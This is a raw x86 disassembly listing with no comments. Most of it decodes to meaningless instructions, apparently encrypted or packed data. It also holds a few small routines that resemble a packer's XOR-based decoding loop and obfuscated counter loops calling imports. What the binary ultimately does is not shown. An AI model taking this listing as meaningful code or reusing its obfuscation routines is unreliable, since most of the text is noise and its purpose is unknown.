  407a92:	mov    ebp,0xe3aa8d3e
  407a97:	cdq    
  407a98:	and    DWORD PTR [ebx],0xffffff91
  407a9b:	add    cl,BYTE PTR [ebx]
  407a9d:	nop
  407a9e:	xchg   edi,eax
  407a9f:	inc    edx
  407aa0:	jns    0x407a8c
  407aa2:	or     BYTE PTR [esi+eax*8-0x4030b23],ah
  407aa9:	pop    esi
  407aaa:	inc    ebp
  407aab:	dec    edi
  407aac:	aam    0x86
  407aae:	dec    eax
  407aaf:	in     al,dx
  407ab0:	inc    edi
  407ab1:	xchg   edx,eax
  407ab2:	test   al,0xb4
  407ab4:	lods   al,BYTE PTR ds:[esi]
  407ab5:	ins    DWORD PTR es:[edi],dx
  407ab6:	adc    al,0xab
  407ab8:	jmp    0x423f:0xabf74487
  407abf:	cmp    BYTE PTR [ebx+0x5596113e],cl
  407ac5:	pop    es
  407ac6:	adc    al,0xcb
  407ac8:	mov    WORD PTR [eax+0x61b5ab2b],?
  407ace:	xchg   edi,eax
  407acf:	push   esp
  407ad0:	and    eax,esp
  407ad2:	aas    
  407ad3:	(bad)  
  407ad4:	imul   ecx,DWORD PTR [eax+0x4c5068b6],0xfca8610a
  407ade:	dec    esp
  407adf:	fist   WORD PTR [ebx+0x46]
  407ae2:	fwait
  407ae3:	cli    
  407ae4:	aaa    
  407ae5:	push   cs
  407ae6:	xor    dh,cl
  407ae8:	out    dx,eax
  407ae9:	outs   dx,DWORD PTR ds:[esi]
  407aea:	mov    eax,esp
  407aec:	cvtps2pi mm0,xmm0
  407aef:	mov    bl,bl
  407af1:	push   es
  407af2:	mov    ch,0x32
  407af4:	lsl    edi,WORD PTR [eax-0x1f]
  407af8:	mov    ah,0x5
  407afa:	sub    edi,DWORD PTR [edi+0x6]
  407afd:	inc    ecx
  407afe:	fldenv ss:[ebp+edx*2-0x60]
  407b03:	pop    eax
  407b04:	add    al,0xe4
  407b06:	or     BYTE PTR ds:[edx+ebp*4],0x5b
  407b0b:	jne    0x407b1b
  407b0d:	pop    ebx
  407b0e:	(bad)
  407b11:	test   cl,bh
  407b13:	loopne 0x407b88
  407b15:	pop    edi
  407b16:	int    0xfb
  407b18:	pop    esp
  407b19:	sub    eax,DWORD PTR [eax+0x67]
  407b1c:	xchg   esp,eax
  407b1d:	call   0xfe42f766
  407b22:	jge    0x407b6a
  407b24:	test   eax,0x205076c2
  407b29:	jmp    DWORD PTR [edx]
  407b2b:	mov    esp,0x54f00e78
  407b30:	and    dl,BYTE PTR [edi]
  407b32:	loop   0x407b3f
  407b34:	loopne 0x407b7a
  407b36:	rol    bl,1
  407b38:	mov    ah,0x4d
  407b3a:	inc    esp
  407b3b:	and    DWORD PTR [edi],0xf84517f9
  407b41:	mov    ebx,0x808260e1
  407b46:	test   BYTE PTR [esp+ebx*1-0x5748c4dc],dl
  407b4d:	mov    ds:0xbdb9a101,al
  407b52:	xor    BYTE PTR [edi+0x1a576103],ah
  407b58:	mov    ah,dl
  407b5a:	addr16 fmul st,st(0)
  407b5d:	fs or  al,0xf2
  407b60:	lock sbb cl,BYTE PTR [ebp+0xa]
  407b64:	stos   DWORD PTR es:[edi],eax
  407b65:	sub    eax,0x28bec90e
  407b6a:	icebp  
  407b6b:	retf   
  407b6c:	sbb    edx,DWORD PTR [edx-0x5059f481]
  407b72:	xchg   edi,eax
  407b73:	cmp    DWORD PTR [ebx+ecx*8],esi
  407b76:	inc    eax
  407b77:	out    dx,eax
  407b78:	hlt    
  407b79:	push   ds
  407b7a:	pop    ebp
  407b7b:	mov    dl,0xde
  407b7d:	call   FWORD PTR [eax+ebx*1-0x25cbf015]
  407b84:	cmovg  eax,esp
  407b87:	and    DWORD PTR [edx-0x2854665],edx
  407b8d:	inc    esp
  407b8e:	sub    ecx,eax
  407b90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b91:	sbb    dh,BYTE PTR [edi-0x5]
  407b94:	cmp    al,0x94
  407b96:	rcl    DWORD PTR ds:0xd2292f3c,cl
  407b9c:	xchg   edx,eax
  407b9d:	out    dx,eax
  407b9e:	and    esi,DWORD PTR [ecx+0x33107d03]
  407ba4:	rol    DWORD PTR [ebx],1
  407ba6:	(bad)  
  407ba7:	cmp    edx,edi
  407ba9:	ja     0x407bff
  407baf:	push   ebx
  407bb0:	jmp    0x407bba
  407bb5:	mov    esi,0x32729f
  407bba:	mov    eax,DWORD PTR [ebp-0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x4]
  407bc0:	xor    edi,ecx
  407bc2:	add    edi,esi
  407bc4:	mov    esi,DWORD PTR [ebp+0x8]
  407bc7:	imul   edi,edx
  407bca:	mov    ebx,DWORD PTR [ebp+0xc]
  407bcd:	xor    eax,ecx
  407bcf:	add    eax,edx
  407bd1:	mov    al,BYTE PTR [ebx+eax*1+0x32729f]
  407bd8:	mov    BYTE PTR [edi+esi*1],al
  407bdb:	mov    eax,DWORD PTR [ebp-0x4]
  407bde:	xor    eax,ecx
  407be0:	lea    edx,[edx+eax*1+0x32729f]
  407be7:	mov    eax,DWORD PTR [ebp-0x4]
  407bea:	xor    eax,ecx
  407bec:	mov    esi,0xffcd8d61
  407bf1:	sub    esi,eax
  407bf3:	add    esi,DWORD PTR [ebp+0x10]
  407bf6:	cmp    edx,esi
  407bf8:	jbe    0x407bb5
  407bfe:	pop    ebx
  407bff:	mov    eax,0xf89c853b
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	leave  
  407c07:	ret    0xc
  407c0a:	push   ebp
  407c0b:	mov    ebp,esp
  407c0d:	mov    eax,ds:0x40d654
  407c12:	mov    DWORD PTR ds:0x417e3d,0x19
  407c1c:	cmp    DWORD PTR ds:0x417e3d,0x0
  407c23:	je     0x407c51
  407c29:	cmp    DWORD PTR ds:0x417e3d,0x1c
  407c30:	jne    0x407c3f
  407c36:	push   DWORD PTR [ebp-0x14]
  407c39:	call   DWORD PTR ds:0x40d368
  407c3f:	mov    ecx,DWORD PTR ds:0x417e3d
  407c45:	dec    ecx
  407c46:	mov    DWORD PTR ds:0x417e3d,ecx
  407c4c:	jmp    0x407c1c
  407c51:	mov    edx,0x32729f
  407c56:	sub    eax,edx
  407c58:	mov    ecx,0x7510859
  407c5d:	and    DWORD PTR ds:0x41237c,0x41abd2
  407c67:	push   esi
  407c68:	and    DWORD PTR ds:0x41abd2,0x0
  407c72:	push   DWORD PTR ds:0x41abd2
  407c78:	pop    esi
  407c79:	inc    esi
  407c7a:	mov    DWORD PTR ds:0x41abd2,esi
  407c80:	cmp    DWORD PTR ds:0x41abd2,0x28
  407c87:	jne    0x407ca2
  407c8d:	push   0x7e5a
  407c92:	push   0x41abde
  407c97:	push   0x1ce6
  407c9c:	call   DWORD PTR ds:0x40d1e0
  407ca2:	cmp    DWORD PTR ds:0x41abd2,0x1f
  407ca9:	jb     0x407c72
  407caf:	xor    DWORD PTR ds:0x412354,ebx
  407cb5:	mov    esi,DWORD PTR [ebp+0xc]
  407cb8:	xor    eax,ecx
  407cba:	jmp    0x407e39
  407cbf:	xchg   ebp,eax
  407cc0:	bound  ecx,QWORD PTR [ecx-0x6a06a6f5]
  407cc6:	pusha  
  407cc7:	jmp    0xcb3f:0x8bfdba79
  407cce:	jp     0x407cb9
  407cd0:	adc    edi,DWORD PTR [esi+0x7e]
  407cd3:	fdivr  QWORD PTR [edi+0x7e]
  407cd6:	jle    0x407c84
  407cd8:	mov    cl,0xa1
  407cda:	pop    edi
  407cdb:	inc    edi
  407cdc:	rcl    BYTE PTR [eax],cl
  407cde:	xchg   esi,eax
  407cdf:	pop    eax
  407ce0:	cmp    edx,esi
  407ce2:	into   
  407ce3:	stc    
  407ce4:	in     eax,dx
  407ce5:	push   ebp
  407ce6:	mov    edx,0xe76c1a79
  407ceb:	inc    esi
  407cec:	call   0x5b36:0x2a011f90
  407cf3:	pop    ecx
  407cf4:	addr16 in eax,dx
  407cf6:	fild   DWORD PTR [edx]
  407cf8:	pop    bp
  407cfa:	aaa    
  407cfb:	push   0x524ef40f
  407d00:	dec    eax
  407d01:	lds    ebx,FWORD PTR [esi]
  407d03:	faddp  st(1),st
  407d05:	dec    esp
  407d06:	scas   eax,DWORD PTR es:[edi]
  407d07:	(bad)  
  407d09:	mov    ecx,0x1f79a71d
  407d0e:	or     BYTE PTR [edi+0x13dbc6b8],0x91
  407d15:	dec    ebx
  407d16:	dec    ecx
  407d17:	fidiv  DWORD PTR [ecx]
  407d19:	inc    esi
  407d1a:	scas   al,BYTE PTR es:[edi]
  407d1b:	pop    esi
  407d1c:	cwde   
  407d1d:	xor    dh,ah
  407d1f:	push   0x3f
  407d21:	jmp    0xe662:0x1e869b76
  407d28:	sub    dh,dl
  407d2a:	popa   
  407d2b:	imul   edx,DWORD PTR [edi],0xffffff93
  407d2e:	pushf  
  407d2f:	stos   DWORD PTR es:[edi],eax
  407d30:	push   eax
  407d31:	jg     0x407d12
  407d33:	push   ebp
  407d34:	inc    ecx
  407d35:	sar    BYTE PTR [edi],1
  407d37:	ds inc edi
  407d39:	mov    al,0x68
  407d3b:	add    ecx,0x40
  407d3e:	adc    esp,DWORD PTR [eax]
  407d40:	xor    eax,0xb30a5e96
  407d45:	dec    esi
  407d46:	rol    BYTE PTR [eax+0x1c],1
  407d49:	sub    BYTE PTR fs:[eax-0x4154767b],0x25
  407d51:	xchg   ecx,eax
  407d52:	fild   DWORD PTR [esi-0x2c]
  407d55:	out    dx,al
  407d56:	loopne 0x407d6e
  407d58:	pop    esi
  407d59:	jmp    0xe0eb:0xc2f280ce
  407d60:	aas    
  407d61:	adc    BYTE PTR [edx-0x2402ddf8],bh
  407d67:	arpl   WORD PTR [esi],sp
  407d69:	push   es
  407d6a:	loope  0x407dd3
  407d6c:	outs   dx,DWORD PTR ss:[esi]
  407d6e:	mov    ebx,0x6d588e84
  407d73:	pop    edx
  407d74:	and    eax,0x81e1b989
  407d79:	hlt    
  407d7a:	sbb    DWORD PTR [ecx],esp
  407d7c:	jmp    0x40160828
  407d81:	mov    ds:0xa56b2eb,eax
  407d86:	in     al,0x23
  407d88:	lahf   
  407d89:	sub    al,0x49
  407d8b:	imul   esi,DWORD PTR [ebx+0x352dd76],0x84c7aaaf
  407d95:	cmp    dh,bh
  407d97:	push   eax
  407d98:	lock sbb al,0xea
  407d9b:	sbb    ebx,edi
  407d9d:	mov    ?,WORD PTR fs:[ecx+ebx*1+0x62]
  407da2:	push   0x32b5eec8
  407da7:	mov    eax,0x1744ff51
  407dac:	das    
  407dad:	(bad)  
  407dae:	int    0xfe
  407db0:	mov    BYTE PTR [eax+edx*4-0x2c],0x40
  407db5:	cmp    edx,0xffffffc8
  407db8:	push   edi
  407db9:	pop    esp
  407dba:	jae    0x407d79
  407dbc:	jp     0x407dee
  407dbe:	inc    esp
  407dbf:	in     eax,0x9d
  407dc1:	enter  0x96a5,0x6e
  407dc5:	dec    ebx
  407dc6:	xchg   edx,eax
  407dc7:	sahf   
  407dc8:	lahf   
  407dc9:	mov    dh,BYTE PTR [eax-0x688845db]
  407dcf:	shl    ebx,1
  407dd1:	adc    DWORD PTR [ecx-0x34],ebx
  407dd4:	or     bh,BYTE PTR [edx-0x5f]
  407dd7:	pop    esp
  407dd8:	in     al,dx
  407dd9:	(bad)  
  407dda:	loope  0x407e2e
  407ddc:	clc    
  407ddd:	fwait
  407dde:	aam    0xed
  407de0:	in     al,0x88
  407de2:	and    al,0x16
  407de4:	outs   dx,BYTE PTR ds:[esi]
  407de5:	jb     0x407dc6
  407de7:	loope  0x407da6
  407de9:	fsub   DWORD PTR [esi-0x6d57f889]
  407def:	pop    ds
  407df0:	int3   
  407df1:	sbb    eax,0xde52c6bb
  407df6:	rcr    DWORD PTR [ebx+0x71],1
  407df9:	lock mov esi,0xdcee060
  407dff:	and    dl,BYTE PTR [eax+0x253d8c4b]
  407e05:	xor    DWORD PTR [esi+0x5c7ffa96],ebp
  407e0b:	lea    edi,[edx+edx*4]
  407e0e:	mov    ds:0x279bc30b,eax
  407e13:	mov    ecx,DWORD PTR [eax-0x5fdc78c6]
  407e19:	inc    edx
  407e1a:	mov    ebx,0x1eeed5d9
  407e1f:	sbb    eax,0x978a89de
  407e24:	cs ins DWORD PTR es:[edi],dx
  407e26:	mov    bl,bh
  407e28:	jno    0x407e30
  407e2a:	pop    ebx
  407e2b:	ins    DWORD PTR es:[edi],dx
  407e2c:	fidiv  DWORD PTR [edx-0x72dc37e9]
  407e32:	in     al,dx
  407e33:	mov    al,0xa7
  407e35:	sub    dh,BYTE PTR [eax*1-0x3839c476]
  407e3c:	add    eax,0x41abe2
  407e41:	aad    0x45
  407e43:	add    BYTE PTR [eax],al
  407e45:	je     0x40818a
  407e4b:	mov    eax,ds:0x40d64c
  407e50:	mov    esi,DWORD PTR [ebp+0xc]
  407e53:	sub    eax,edx
  407e55:	xor    eax,ecx
  407e57:	cmp    eax,esi
  407e59:	jne    0x407e6f
  407e5f:	mov    eax,ds:0x40d654
  407e64:	add    eax,DWORD PTR ds:0x40d64c
  407e6a:	jmp    0x407ff5
  407e6f:	mov    eax,DWORD PTR [ebp+0xc]
  407e72:	jmp    0x407ff1
  407e77:	icebp  
  407e78:	mov    ebp,0x65db1f07
  407e7d:	mov    ecx,0x1c6c5851
  407e82:	cmp    esi,ecx
  407e84:	sub    eax,DWORD PTR [ebx]
  407e86:	push   eax
  407e87:	dec    edi
  407e88:	adc    BYTE PTR [esi+0x7e],bh
  407e8b:	fdivr  QWORD PTR [edi+0x7e]
  407e8e:	jle    0x407e3b
  407e90:	push   edi
  407e91:	jbe    0x407e8f
  407e93:	add    BYTE PTR [ebp+0x20],dl
  407e96:	mov    ebx,0xda434221
  407e9b:	clc    
  407e9c:	and    BYTE PTR [edx+0x25d53349],ch
  407ea2:	dec    ecx
  407ea3:	jp     0x407e35
  407ea5:	loope  0x407e53
  407ea7:	mov    esi,0x8f3c1f01
  407eac:	add    bl,BYTE PTR [esi+edx*1]
  407eaf:	daa    
  407eb0:	dec    ebx
  407eb1:	push   ebp
  407eb2:	shr    DWORD PTR [edx*2-0x3531ba76],0x9b
  407eba:	hlt    
  407ebb:	sub    al,0x48
  407ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ebe:	xor    DWORD PTR [eax+0x55],eax
  407ec1:	sar    BYTE PTR [ebp+0xe],1
  407ec4:	loope  0x407f1b
  407ec6:	and    DWORD PTR [esp+edi*2],eax
  407ec9:	fwait
  407eca:	test   DWORD PTR [esi+ebx*4-0x3397188e],0xf6e8a1f2
  407ed5:	sahf   
  407ed6:	out    0x32,al
  407ed8:	jmp    0x407f1f
  407eda:	aam    0xb3
  407edc:	arpl   WORD PTR [ebp+0x7fa7b373],si
  407ee2:	fld    st(7)
  407ee4:	pop    ebp
  407ee5:	outs   dx,DWORD PTR ds:[esi]
  407ee6:	push   cs
  407ee7:	mov    ebp,0xe1d65b2a
  407eec:	outs   dx,DWORD PTR ds:[esi]
  407eed:	ja     0x407f69
  407eef:	popf   
  407ef0:	ret    0xb5b2
  407ef3:	xor    ebx,DWORD PTR [edi]
  407ef5:	or     edi,DWORD PTR [ecx+0x4f]
  407ef8:	inc    esi
  407ef9:	imul   edi,edi,0x5e85067b
  407eff:	xchg   esp,eax
  407f00:	je     0x407ea8
  407f02:	lods   al,BYTE PTR ds:[esi]
  407f03:	popf   
  407f04:	mov    edi,0x18a0f741
  407f09:	pop    ecx
  407f0a:	mov    dl,0x41
  407f0c:	dec    eax
  407f0d:	adc    DWORD PTR ds:0xa18b6e6e,esi
  407f13:	and    esp,DWORD PTR [esi-0x4f829309]
  407f19:	xchg   ebp,eax
  407f1a:	jmp    0xa26d:0x3e3f1d8a
  407f21:	stc    
  407f22:	push   0xffffffeb
  407f24:	add    ebp,DWORD PTR [ecx+0xf5cd9c8]
  407f2a:	and    al,0x93
  407f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f2d:	ja     0x407eb6
  407f2f:	aam    0xc5
  407f31:	dec    esi
  407f32:	retf   0x9246
  407f35:	push   eax
  407f36:	sbb    ah,0x3b
  407f39:	pop    ecx
  407f3a:	shr    BYTE PTR [esi-0x2e411380],1
  407f40:	imul   eax,DWORD PTR [edi-0x1b0e643f],0x286b3dad
  407f4a:	and    eax,0xd15ba531
  407f4f:	xor    ah,BYTE PTR [ebx-0x36]
  407f52:	sub    edx,esp
  407f54:	sar    BYTE PTR [edx+0x1b6689f5],1
  407f5a:	enter  0xe711,0x60
  407f5e:	cmp    eax,0x8d5881c1
  407f63:	hlt    
  407f64:	mov    dl,0x4e
  407f66:	xor    DWORD PTR [edi+0x23fd9f26],eax
  407f6c:	aas    
  407f6d:	enter  0x25b8,0x9a
  407f71:	mov    esp,0xff47239f
  407f76:	gs aaa 
  407f78:	sbb    eax,0xc6de6523
  407f7d:	out    0xf7,al
  407f7f:	xchg   ecx,eax
  407f80:	push   eax
  407f81:	fdivrp st(0),st
  407f83:	test   ecx,eax
  407f85:	int    0x85
  407f87:	pop    edi
  407f88:	pop    edx
  407f89:	call   0xe926:0x4c2edc5f
  407f90:	push   esi
  407f91:	stc    
  407f92:	push   es
  407f93:	fnstcw WORD PTR [ebp-0xd39207e]
  407f99:	inc    DWORD PTR [ebx+0x4f72abcb]
  407f9f:	push   eax
  407fa0:	aas    
  407fa1:	xor    esp,DWORD PTR [ebp+edi*8+0x73]
  407fa5:	popf   
  407fa6:	mov    ebp,0x71f8e3c4
  407fab:	cmp    al,0xc0
  407fad:	sub    eax,0x8cb0ce8e
  407fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fb3:	fstp   TBYTE PTR [eax+0x57fc7076]
  407fb9:	pop    esp
  407fba:	mov    ch,0xd6
  407fbc:	mov    bh,0xe6
  407fbe:	lods   eax,DWORD PTR ds:[esi]
  407fbf:	and    DWORD PTR [eax],eax
  407fc1:	mov    dl,0x75
  407fc3:	jmp    0xa38e:0x222d13e4
  407fca:	fcmovb st,st(0)
  407fcc:	data16 mov BYTE PTR [ecx-0xf17add5],bl
  407fd3:	and    eax,0xc87a2d0a
  407fd8:	iret   
  407fd9:	jo     0x407f8c
  407fdb:	fidivr WORD PTR [edi+0x616caf8b]
  407fe1:	mov    dl,al
  407fe3:	adc    eax,0xfdb10f78
  407fe8:	sbb    al,0x85
  407fea:	loop   0x408029
  407fec:	aam    0xea
  407fee:	push   ecx
  407fef:	pop    edx
  407ff0:	cmp    esi,DWORD PTR [ebx]
  407ff2:	rol    DWORD PTR [ebx],0xc2
  407ff5:	mov    ds:0x40d64c,eax
  407ffa:	mov    eax,DWORD PTR [ebp+0xc]
  407ffd:	jmp    0x40817c
  408002:	and    ebp,DWORD PTR [edi]
  408004:	pop    ds
  408005:	xchg   edx,eax
  408006:	adc    esp,DWORD PTR [edx+0x57bdafa3]
  40800c:	arpl   WORD PTR [edi],si
  40800e:	mov    WORD PTR [edi],es
  408010:	add    ch,ah
  408012:	sub    eax,0xdc7e7e16
  408017:	jg     0x408097
  408019:	jle    0x40806c
  40801b:	push   eax
  40801c:	jne    0x407ff4
  40801e:	add    eax,0xee972069
  408023:	jmp    0xf9d6:0x4eeaf018
  40802a:	std    
  40802b:	outs   dx,DWORD PTR ds:[esi]
  40802c:	aam    0xb9
  40802e:	push   0x668231da
  408033:	div    DWORD PTR [esi+0x2d]
  408036:	xchg   edx,eax
  408037:	int    0xe6
  408039:	sahf   
  40803a:	adc    al,0x20
  40803c:	jns    0x407fcf
  40803e:	test   BYTE PTR [ecx+ebp*1+0x6e],bl
  408042:	pop    ebp
  408043:	loop   0x408093
  408045:	push   es
  408046:	test   eax,0xd40413a7
  40804b:	out    dx,eax
  40804c:	push   ebx
  40804d:	dec    ebx
  40804e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40804f:	imul   esi,DWORD PTR [edi-0x60],0x7b
  408053:	popa   
  408054:	or     BYTE PTR [eax+0x55],ch
  408057:	cmp    al,0xc7
  408059:	lods   al,BYTE PTR ds:[esi]
  40805a:	push   ebx
  40805b:	and    al,0x72
  40805d:	ins    BYTE PTR es:[edi],dx
  40805e:	pop    ebx
  40805f:	push   esp
  408060:	mov    al,ds:0xf889034c
  408065:	mov    esp,0x33ead631
  40806a:	xor    edx,eax
  40806c:	mov    al,ds:0xb677d158
  408071:	or     ecx,DWORD PTR [esi]
  408073:	adc    DWORD PTR ds:0xb51f1b42,0xd757bf30
  40807d:	xchg   edx,eax
  40807e:	and    DWORD PTR [eax-0x41317eff],edx
  408084:	cwde   
  408085:	jmp    0x8d49:0x2fecb787
  40808c:	add    BYTE PTR [ebx+eax*2-0x6bd00dbc],bl
  408093:	pushf  
  408094:	nop
  408095:	pop    edx
  408096:	inc    eax
  408097:	xchg   DWORD PTR [edi+0x27],edx
  40809a:	adc    ah,BYTE PTR [ecx+ecx*2]
  40809d:	mov    eax,0x7d80f834
  4080a2:	ret    
  4080a3:	jno    0x408063
  4080a5:	out    0xe1,al
  4080a7:	in     al,dx
  4080a8:	pop    ecx
  4080a9:	xor    al,0x2e
  4080ab:	cmp    dh,BYTE PTR [edi-0x6f]
  4080ae:	push   cs
  4080af:	test   eax,0xd86a837b
  4080b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080b5:	outs   dx,DWORD PTR ds:[esi]
  4080b6:	jnp    0x4080c6
  4080b8:	fcomp  st(1)
  4080ba:	dec    esi
  4080bb:	push   ds
  4080bc:	and    eax,0xd0973d70
  4080c1:	jle    0x408056
  4080c3:	cmp    bh,BYTE PTR [esi+0x6851589a]
  4080c9:	inc    ecx
  4080ca:	push   esp
  4080cb:	ja     0x408079
  4080cd:	fisub  DWORD PTR [ecx]
  4080cf:	scas   al,BYTE PTR es:[edi]
  4080d0:	js     0x4080d5
  4080d2:	into   
  4080d3:	test   eax,0x5e71c0c7
  4080d8:	out    0x8f,al
  4080da:	(bad)  
  4080db:	jl     0x40814b
  4080dd:	fcom   DWORD PTR [esp+ebp*2+0x5cd15c5d]
  4080e4:	ror    DWORD PTR [edi],1
  4080e6:	xor    edx,0xffffffb6
  4080e9:	sub    DWORD PTR [edi+0xe457dc1],ebx
  4080ef:	xchg   ebx,eax
  4080f0:	les    ecx,FWORD PTR [esi+0x1d]
  4080f3:	pop    es
  4080f4:	aaa    
  4080f5:	cmp    eax,0x907c8f04
  4080fa:	outs   dx,BYTE PTR ds:[esi]
  4080fb:	or     BYTE PTR [edx],dl
  4080fd:	out    dx,al
  4080fe:	add    eax,ebx
  408100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408101:	or     al,dl
  408103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408104:	sbb    al,0x4b
  408106:	ficomp DWORD PTR [ebx]
  408108:	rol    BYTE PTR ds:0x1cf861c2,1
  40810e:	mov    dl,0xa2
  408110:	pop    esp
  408111:	xchg   ebp,eax
  408112:	sub    edx,ebx
  408114:	test   BYTE PTR [esi+0x0],bl
  408117:	xor    DWORD PTR [ebx-0x6367feef],esi
  40811d:	xchg   esp,eax
  40811e:	ror    BYTE PTR es:[ebp+0x1035bd27],0x46
  408126:	mov    BYTE PTR [eax+ebx*8],ah
  408129:	aad    0xf4
  40812b:	xor    BYTE PTR [ebx+0x3acb2ccc],ah
  408131:	sub    al,0xe1
  408133:	push   ebp
  408134:	xor    eax,0xbc340ecb
  408139:	dec    edx
  40813a:	jg     0x408179
  40813c:	sub    al,0x78
  40813e:	cs cmp ah,dl
  408141:	jo     0x4080fc
  408143:	aam    0x3b
  408145:	inc    edi
  408146:	mov    ch,0xf4
  408148:	xchg   ebp,eax
  408149:	jl     0x408116
  40814b:	adc    al,0xd9
  40814d:	(bad)  
  40814e:	xor    BYTE PTR [esi],ah
  408150:	jns    0x40815c
  408152:	mov    esp,0x492ae6a9
  408157:	bound  edx,QWORD PTR [esi]
  408159:	push   ss
  40815a:	push   eax
  40815b:	inc    cl
  40815d:	xchg   BYTE PTR [ebp+edi*8-0x8],bh
  408161:	stc    
  408162:	mov    al,ds:0x224becb3
  408167:	in     al,dx
  408168:	jmp    FWORD PTR [edx+0x60]
  40816b:	push   0xffffff86
  40816d:	or     dl,bh
  40816f:	fstp   TBYTE PTR [eax]
  408171:	or     BYTE PTR [edx-0x76],cl
  408174:	and    ebx,esi
  408176:	push   ds
  408177:	out    0xa4,al
  408179:	add    edi,DWORD PTR [eax+0x3c133a1]
  40817f:	ret    0x54a3
  408182:	(bad)  
  408183:	inc    eax
  408184:	add    cl,ch
  408186:	mov    DWORD PTR [ecx],eax
  408188:	add    BYTE PTR [eax],al
  40818a:	mov    eax,ds:0x40d654
  40818f:	jmp    0x40830e
  408194:	push   edi
  408195:	(bad)  [ecx+0x797ba9ef]
  40819b:	gs mov ch,0x6e
  40819e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819f:	es xchg ebx,eax
  4081a1:	pop    ebp
  4081a2:	xchg   ecx,eax
  4081a3:	enter  0x1783,0x7e
  4081a7:	jle    0x408185
  4081a9:	jg     0x408229
  4081ab:	jle    0x40821c
  4081ad:	ret    
  4081ae:	xchg   edi,eax
  4081af:	push   ecx
  4081b0:	xor    DWORD PTR fs:[esi+0x57e9de61],ecx
  4081b7:	mov    ch,0xb2
  4081b9:	xchg   di,ax
  4081bb:	sub    DWORD PTR [esi+0x5f],0xe44f248a
  4081c2:	inc    eax
  4081c3:	push   ebx
  4081c4:	pop    ebx
  4081c5:	fwait
  4081c6:	jb     0x4081aa
  4081c8:	enter  0x2ecc,0xb0
  4081cc:	std    
  4081cd:	ret    0x5b0e
  4081d0:	mov    cl,0x54
  4081d2:	mov    cl,0x70
  4081d4:	jg     0x40815c
  4081d6:	sub    cl,BYTE PTR [esi-0x5186bce5]
  4081dc:	addr16 mov ds:0xd76f,al
  4081e0:	loope  0x408223
  4081e2:	repnz or al,0x47
  4081e5:	dec    edx
  4081e6:	add    ebx,edi
  4081e8:	aam    0xd6
  4081ea:	(bad)  
  4081eb:	clc    
  4081ec:	scas   al,BYTE PTR es:[edi]
  4081ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081ee:	ins    BYTE PTR es:[edi],dx
  4081ef:	or     DWORD PTR [ebx+0x4],ebp
  4081f2:	int3   
  4081f3:	and    eax,0xa8bd7058
  4081f8:	add    ebx,DWORD PTR [esi-0x11]
  4081fb:	rol    edx,cl
  4081fd:	popf   
  4081fe:	sbb    eax,0x499f219e
  408203:	test   al,0xc7
  408205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408206:	inc    ebx
  408207:	push   ss
  408208:	xor    eax,0x18aa14b
  40820d:	clc    
  40820e:	shl    esp,cl
  408210:	pop    esi
  408211:	sti    
  408212:	dec    edi
  408213:	push   esi
  408214:	(bad)  
  408215:	sbb    bl,BYTE PTR [edx-0x64614868]
  40821b:	inc    eax
  40821c:	push   ebp
  40821d:	mov    ah,0x20
  40821f:	sbb    BYTE PTR [eax+0x61],ch
  408222:	push   esp
  408223:	cmc    
  408224:	clc    
  408225:	pop    es
  408226:	add    edi,DWORD PTR [eax]
  408228:	test   eax,0x718ef53f
  40822d:	retf   
  40822e:	sahf   
  40822f:	cmp    edi,DWORD PTR [ebx+edi*2+0x40a54e78]
  408236:	mov    bl,BYTE PTR [edx-0x45]
  408239:	pop    edi
  40823a:	lods   al,BYTE PTR ds:[esi]
  40823b:	(bad)  
  40823c:	aad    0x6d
  40823e:	jmp    0x40821b
  408240:	(bad)  
  408241:	mov    edi,0xd56e4c87
  408246:	cmp    BYTE PTR [ebp+0xa],dl
  408249:	push   ebx
  40824a:	cwde   
  40824b:	ins    BYTE PTR es:[edi],dx
  40824c:	mov    ds:0xacc759d4,eax
  408251:	jp     0x408250
  408253:	push   0x36eebe4c
  408258:	or     DWORD PTR [eax+0x2f876c84],eax
  40825e:	and    DWORD PTR [edx],ebp
  408260:	cld    
  408261:	pop    ebp
  408262:	icebp  
  408263:	jno    0x40826e
  408265:	lea    eax,[ebx+0x2a6ca272]
  40826b:	mov    eax,0x93d59c6d
  408270:	lahf   
  408271:	mov    esi,0x5edaaea2
  408276:	(bad)  [ecx+edx*2]
  408279:	out    0x1f,eax
  40827b:	xor    esp,ebp
  40827d:	cli    
  40827e:	mov    ch,BYTE PTR [esi-0x5a539a82]
  408284:	adc    eax,0xdd341e26
  408289:	mov    dh,al
  40828b:	cs icebp 
  40828d:	lods   eax,DWORD PTR ds:[esi]
  40828e:	inc    esi
  40828f:	bound  esi,QWORD PTR [ebx]
  408291:	loop   0x408216
  408293:	nop
  408294:	btc    eax,esi
  408297:	into   
  408298:	push   0xfffffff5
  40829a:	mov    al,BYTE PTR [ebp+0x42328ae3]
  4082a0:	repz jo 0x408305
  4082a3:	cmp    eax,0xb1ad9483
  4082a8:	sub    al,0xc8
  4082ab:	ret    
  4082ac:	aas    
  4082ad:	xchg   ebx,eax
  4082ae:	dec    ecx
  4082af:	out    0x87,ax
  4082b2:	cmp    DWORD PTR [ebx+0x102d5b4b],ebp
  4082b8:	sbb    al,BYTE PTR [edi+ecx*8-0xbe788d2]
  4082bf:	ins    BYTE PTR es:[edi],dx
  4082c0:	ins    DWORD PTR es:[edi],dx
  4082c1:	xor    BYTE PTR ds:[esi+0x1cc2c01b],bl
  4082c8:	xchg   esp,edx
  4082ca:	sahf   
  4082cb:	push   0x69d7640d
  4082d0:	add    ebp,DWORD PTR [eax-0x50]
  4082d3:	clc    
  4082d4:	stos   BYTE PTR es:[edi],al
  4082d5:	push   cs
  4082d6:	mov    edi,0x94197a02
  4082db:	in     eax,dx
  4082dc:	jl     0x408292
  4082de:	cld    
  4082df:	lods   al,BYTE PTR ds:[esi]
